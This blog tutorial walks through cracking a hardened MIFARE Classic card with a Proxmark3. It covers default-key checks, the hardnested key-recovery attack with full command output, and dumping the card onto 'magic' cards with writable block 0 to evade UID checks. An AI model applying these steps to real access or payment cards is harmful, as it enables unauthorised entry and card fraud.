---
layout: post
title: Breaking Hardened MIFARE with Proxmark3
featured: true
date: '2018-08-08 20:19:09'
tags:
- proxmark3
---

The traditional attacks on MIFARE cards rely on weak random number generation. The two most common attacks using the Proxmark3 are the darkside attack `hf mf mifare` and the nested attack `hf mf nested`. Neither of these attacks work on modern MIFARE cards with hardened pseudorandom number generation (PRNG).

How do you know which PRNG (weak or hardened) the card is using? Boot up your Proxmark3, put the card on it, and run `hf search`:

```
    proxmark3> hf search
    UID : 20 2e 19 a4           
    ATQA : 00 04          
     SAK : 08 [2]          
    TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1          
    proprietary non iso14443-4 card found, RATS not supported          
    No chinese magic backdoor command detected          
    Prng detection: HARDENED (hardnested)          

    Valid ISO14443A Tag Found - Quiting Search
```

Notice the line that says `Prng detection: HARDENED (hardnested)`. This is confirmation that we are dealing with a **hardened** MIFARE card and the two common attacks mentioned previously will not work.

## Finding a Key

The first step in cracking a hardened MIFARE card is to discover a valid key. This is usually very easy as most cards will have sectors using the default key of `FFFFFFFFFFFF`. To check a few common keys, try the `hf mf chk *1 ? t` command:

```
    proxmark3> hf mf chk *1 ? t
    No key specified, trying default keys          
    chk default key[0] ffffffffffff          
    chk default key[1] 000000000000          
    chk default key[2] a0a1a2a3a4a5          
    chk default key[3] b0b1b2b3b4b5          
    chk default key[4] aabbccddeeff          
    chk default key[5] 1a2b3c4d5e6f          
    chk default key[6] 123456789abc          
    chk default key[7] 010203040506          
    chk default key[8] 123456abcdef          
    chk default key[9] abcdef123456          
    chk default key[10] 4d3a99c351dd          
    chk default key[11] 1a982c7e459a          
    chk default key[12] d3f7d3f7d3f7          
    chk default key[13] 714c5c886e97          
    chk default key[14] 587ee5f9350f          
    chk default key[15] a0478cc39091          
    chk default key[16] 533cb6c723f6          
    chk default key[17] 8fd0a4f256e9          

    To cancel this operation press the button on the proxmark...          
    --o          
    |---|----------------|---|----------------|---|          
    |sec|key A |res|key B |res|          
    |---|----------------|---|----------------|---|          
    |000| ffffffffffff | 1 | ffffffffffff | 1 |          
    |001| ffffffffffff | 0 | ffffffffffff | 0 |          
    |002| ffffffffffff | 1 | ffffffffffff | 1 |          
    |003| ffffffffffff | 1 | ffffffffffff | 1 |          
    |004| ffffffffffff | 1 | ffffffffffff | 1 |          
    |005| ffffffffffff | 1 | ffffffffffff | 1 |          
    |006| ffffffffffff | 1 | ffffffffffff | 1 |          
    |007| ffffffffffff | 1 | ffffffffffff | 1 |          
    |008| ffffffffffff | 1 | ffffffffffff | 1 |          
    |009| ffffffffffff | 1 | ffffffffffff | 1 |          
    |010| ffffffffffff | 1 | ffffffffffff | 1 |          
    |011| ffffffffffff | 1 | ffffffffffff | 1 |          
    |012| ffffffffffff | 1 | ffffffffffff | 1 |          
    |013| ffffffffffff | 1 | ffffffffffff | 1 |          
    |014| ffffffffffff | 1 | ffffffffffff | 1 |          
    |015| ffffffffffff | 1 | ffffffffffff | 1 |          
    |---|----------------|---|----------------|---|          
    Found keys have been transferred to the emulator memory
```

At first glance, it looks like we got lucky and all the keys were the default `FFFFFFFFFFFF` key. However, this is not actually the case. Notice the `res` column is either equal to `1` or `0`. A `1` in the column means the key was valid for that sector. A `0` in the column means the key is not valid and the Proxmark3 is using the default key of `FFFFFFFFFFFF` as a placeholder. We can confirm this by displaying the valid keys stored in emulator memory using `hf mf ekeyprn`:

```
    |---|----------------|----------------|          
    |sec|key A |key B |          
    |---|----------------|----------------|          
    |000| ffffffffffff | ffffffffffff |          
    |001| 000000000000 | 000000000000 |          
    |002| ffffffffffff | ffffffffffff |          
    |003| ffffffffffff | ffffffffffff |          
    |004| ffffffffffff | ffffffffffff |          
    |005| ffffffffffff | ffffffffffff |          
    |006| ffffffffffff | ffffffffffff |          
    |007| ffffffffffff | ffffffffffff |          
    |008| ffffffffffff | ffffffffffff |          
    |009| ffffffffffff | ffffffffffff |          
    |010| ffffffffffff | ffffffffffff |          
    |011| ffffffffffff | ffffffffffff |          
    |012| ffffffffffff | ffffffffffff |          
    |013| ffffffffffff | ffffffffffff |          
    |014| ffffffffffff | ffffffffffff |          
    |015| ffffffffffff | ffffffffffff |          
    |---|----------------|----------------|
```

Notice that `sector 001` above shows as `000000000000`, which means that the key was not discovered for that sector. Still, finding the key for 15/16 sectors is pretty good!

## Cracking the "Secure" Sectors

Now that we have a valid key for the card, we are able to utilize the `hf mf hardnested` command to unlock `sector 001`. Before we do that, we need to make sure we verify we can unlock a block using the key we've already discovered. Then we need to get a block number that we are unable to currently access. Use the chart below as a reference:

```
    Sector 000 - Block 0-3
    Sector 001 - Block 4-7
    Sector 002 - Block 8-11
    Sector 003 - Block 12-15
    Sector 004 - Block 16-19
    Sector 005 - Block 20-23
    Sector 006 - Block 24-27
    Sector 007 - Block 28-31
    Sector 008 - Block 32-35
    Sector 009 - Block 36-39
    Sector 010 - Block 40-43
    Sector 011 - Block 44-47
    Sector 012 - Block 48-51
    Sector 013 - Block 52-55
    Sector 014 - Block 56-59
    Sector 015 - Block 60-63
```

Using the above conversion chart, we should be able to unlock `block 0` with the key `FFFFFFFFFFFF` and we should be unsuccessful unlocking `block 4` using the same key. Let's verify:

```
    proxmark3> hf mf chk 0 A FFFFFFFFFFFF
    chk key[0] ffffffffffff          

    Found valid key:[0:A]ffffffffffff          

```

```
    proxmark3> hf mf chk 4 A FFFFFFFFFFFF
    chk key[0] ffffffffffff          


    No valid keys found.
```

Perfect! We have verified the key works successfully with `block 0`, but does not work at all with `block 4`. `Block 4` is part of `sector 001`, which we haven't cracked yet, so it all makes sense.

Now let's use the hardnested attack to unlock `sector 001`:

```
    proxmark3> hf mf hardnested 0 A FFFFFFFFFFFF 4 A
    --target block no: 4, target key type:A, known target key: 0x000000000000 (not set), file action: none, Slow: No, Tests: 0
    Using AVX2 SIMD core.



     time | #nonces | Activity | expected to brute force
             | | | #states | time
    ------------------------------------------------------------------------------------------------------
           0 | 0 | Start using 4 threads and AVX2 SIMD core | |
           0 | 0 | Brute force benchmark: 900 million (2^29.7) keys/s | 140737488355328 | 2d
           1 | 0 | Using 235 precalculated bitflip state tables | 140737488355328 | 2d
           4 | 112 | Apply bit flip properties | 153070288896 | 3min
           5 | 224 | Apply bit flip properties | 38262738944 | 43s
           6 | 336 | Apply bit flip properties | 33238697984 | 37s
           7 | 448 | Apply bit flip properties | 33104111616 | 37s
           8 | 559 | Apply bit flip properties | 30823223296 | 34s
           9 | 671 | Apply bit flip properties | 30728589312 | 34s
           9 | 783 | Apply bit flip properties | 30728589312 | 34s
          10 | 891 | Apply bit flip properties | 30728589312 | 34s
          10 | 1002 | Apply bit flip properties | 30728589312 | 34s
          11 | 1113 | Apply bit flip properties | 30728589312 | 34s
          12 | 1223 | Apply bit flip properties | 30728589312 | 34s
          13 | 1335 | Apply bit flip properties | 30728589312 | 34s
          14 | 1443 | Apply bit flip properties | 30728589312 | 34s
          15 | 1553 | Apply bit flip properties | 30728589312 | 34s
          15 | 1660 | Apply bit flip properties | 30728589312 | 34s
          17 | 1770 | Apply Sum property. Sum(a0) = 144 | 1224898816 | 1s
          18 | 1878 | Apply bit flip properties | 2006925312 | 2s
          18 | 1986 | Apply bit flip properties | 1101943296 | 1s
          19 | 2095 | Apply bit flip properties | 1406170624 | 2s
          20 | 2095 | (1. guess: Sum(a8) = 0) | 1406170624 | 2s
          20 | 2095 | Apply Sum(a8) and all bytes bitflip properties | 1331002112 | 1s
          20 | 2095 | Brute force phase completed. Key found: 8a19d40cf2b5 | 0 | 0s

```

Notice at the bottom it says `Key found: 8a19d40cf2b5`! Sweet!

So let's print the key table again using `hf mf ekeyprn`:

```
    proxmark3> hf mf ekeyprn
    |---|----------------|----------------|          
    |sec|key A |key B |          
    |---|----------------|----------------|          
    |000| ffffffffffff | ffffffffffff |          
    |001| 000000000000 | 000000000000 |          
    |002| ffffffffffff | ffffffffffff |          
    |003| ffffffffffff | ffffffffffff |          
    |004| ffffffffffff | ffffffffffff |          
    |005| ffffffffffff | ffffffffffff |          
    |006| ffffffffffff | ffffffffffff |          
    |007| ffffffffffff | ffffffffffff |          
    |008| ffffffffffff | ffffffffffff |          
    |009| ffffffffffff | ffffffffffff |          
    |010| ffffffffffff | ffffffffffff |          
    |011| ffffffffffff | ffffffffffff |          
    |012| ffffffffffff | ffffffffffff |          
    |013| ffffffffffff | ffffffffffff |          
    |014| ffffffffffff | ffffffffffff |          
    |015| ffffffffffff | ffffffffffff |          
    |---|----------------|----------------|
```

What gives? Why is our new key not in the table? We need to run the `hf mf chk` command again to verify this new key and add it to the internal key buffer table:

```
    proxmark3> hf mf chk *1 ? t 8a19d40cf2b5
    chk key[0] 8a19d40cf2b5          

    To cancel this operation press the button on the proxmark...          
    --o          
    |---|----------------|---|----------------|---|          
    |sec|key A |res|key B |res|          
    |---|----------------|---|----------------|---|          
    |000| ffffffffffff | 0 | ffffffffffff | 0 |          
    |001| 8a19d40cf2b5 | 1 | 8a19d40cf2b5 | 1 |          
    |002| ffffffffffff | 0 | ffffffffffff | 0 |          
    |003| ffffffffffff | 0 | ffffffffffff | 0 |          
    |004| ffffffffffff | 0 | ffffffffffff | 0 |          
    |005| ffffffffffff | 0 | ffffffffffff | 0 |          
    |006| ffffffffffff | 0 | ffffffffffff | 0 |          
    |007| ffffffffffff | 0 | ffffffffffff | 0 |          
    |008| ffffffffffff | 0 | ffffffffffff | 0 |          
    |009| ffffffffffff | 0 | ffffffffffff | 0 |          
    |010| ffffffffffff | 0 | ffffffffffff | 0 |          
    |011| ffffffffffff | 0 | ffffffffffff | 0 |          
    |012| ffffffffffff | 0 | ffffffffffff | 0 |          
    |013| ffffffffffff | 0 | ffffffffffff | 0 |          
    |014| ffffffffffff | 0 | ffffffffffff | 0 |          
    |015| ffffffffffff | 0 | ffffffffffff | 0 |          
    |---|----------------|---|----------------|---|          
    Found keys have been transferred to the emulator memory
```

Cool! It shows as valid for `sector 001`. However, the `res` column for every other sector is now `0`. Don't worry about that because our key table is still accurate:

```
    proxmark3> hf mf ekeyprn
    |---|----------------|----------------|          
    |sec|key A |key B |          
    |---|----------------|----------------|          
    |000| ffffffffffff | ffffffffffff |          
    |001| 8a19d40cf2b5 | 8a19d40cf2b5 |          
    |002| ffffffffffff | ffffffffffff |          
    |003| ffffffffffff | ffffffffffff |          
    |004| ffffffffffff | ffffffffffff |          
    |005| ffffffffffff | ffffffffffff |          
    |006| ffffffffffff | ffffffffffff |          
    |007| ffffffffffff | ffffffffffff |          
    |008| ffffffffffff | ffffffffffff |          
    |009| ffffffffffff | ffffffffffff |          
    |010| ffffffffffff | ffffffffffff |          
    |011| ffffffffffff | ffffffffffff |          
    |012| ffffffffffff | ffffffffffff |          
    |013| ffffffffffff | ffffffffffff |          
    |014| ffffffffffff | ffffffffffff |          
    |015| ffffffffffff | ffffffffffff |          
    |---|----------------|----------------|
```

Nice! We've broken all sectors and we can now dump / restore the card!

## Dumping and Restoring the MIFARE Card

This part is simple. You just need to run `hf mf dump` to dump the contents of the MIFARE card to a file on your disk. After that, you need to run `hf mf restore` using a compatible blank card.

### Why doesn't the card work?

If the card works for you after the above, great! If not, you may be left wondering where you went wrong. The MIFARE card standard says that `Block 0` should be read-only. This effectively means that the card cannot be identically duplicated for security reasons. A lot of RFID systems verify that the UID on the card is correct and your duplicate will be detected. So what can you do?

Enter the Chinese Magic Backdoor cards! These special MIFARE cards utilize a writable `Block 0` that allow you to completely clone a card and it will be virtually undetectable! There are a few types you should be aware of:

**UID** - The original Chinese Magic Backdoor card. These cards respond to the backdoor commands and will show `Chinese magic backdoor commands (GEN 1a) detected` when you do an `hf search`. These cards can be detected by probing the card to see if it responds to the backdoor commands. Some RFID systems may try to detect these cards.

**CUID** - The 2nd generation Chinese Magic Backdoor card. These cards do not use the backdoor commands, but instead allow `Block 0` to be written to like any other block on the card. This gives the card better compatibility to be written to from an Android phone. However, some RFID systems can detect this type of card by sending a write command to `Block 0`, making the card invalid after the first use is attempted.

**FUID** - This type of card is not as common, but allows `Block 0` to be written to just once. This allows you to create a clone of a card and any checks done by the RFID system will pass because `Block 0` is no longer writable.

**UFUID** - This type of card is apparently a "better" version of the FUID card. Instead of only allowing `Block 0` to be written once, you can write to it many times and then lock the block later when you're happy with the result. After locking `Block 0`, it cannot be unlocked to my knowledge. I do not think there is currently a way to lock these cards using the Proxmark3.

Both a UID and CUID card are included with the Proxmark3 Easy (or at least the one I bought on Ebay...). To write `Block 0`, I used the `hf mf csetuid` command. This card then worked perfectly. Hooray!
